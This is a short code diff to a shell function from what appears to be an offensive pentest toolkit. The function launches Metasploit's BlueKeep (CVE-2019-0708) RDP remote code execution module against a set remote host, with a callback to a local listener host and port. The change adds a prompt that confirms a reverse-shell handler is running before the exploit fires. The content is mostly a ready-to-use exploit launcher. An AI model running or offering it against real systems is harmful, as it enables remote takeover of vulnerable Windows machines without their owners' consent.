@@ -130,7 +130,16 @@ nb-enum-rdp-msf-bluekeep-exploit() {
     nb-vars-set-rhost
     nb-vars-set-lhost
     nb-vars-set-lport
-    #__warn "Start a handler using on ${__LHOST}:${__LPORT} before proceeding"
+
+    __ask "Did you start a handler? (y/n)"
+    local sh && __askvar sh "ANSWER"
+
+    if [[ $sh == "n" ]]; then
+      __err "Start a handler using on ${__LHOST}:${__LPORT} before proceeding."
+      __info "Use nb-shell-handlers-msf-listener."
+      exit 1
+    fi
+
     __msf << VAR
 use windows/rdp/cve_2019_0708_bluekeep_rce;
 set RHOSTS ${__RHOST};
@@ -142,5 +151,4 @@ set LPORT ${__LPORT};
 run;
 exit
 VAR
-
 }
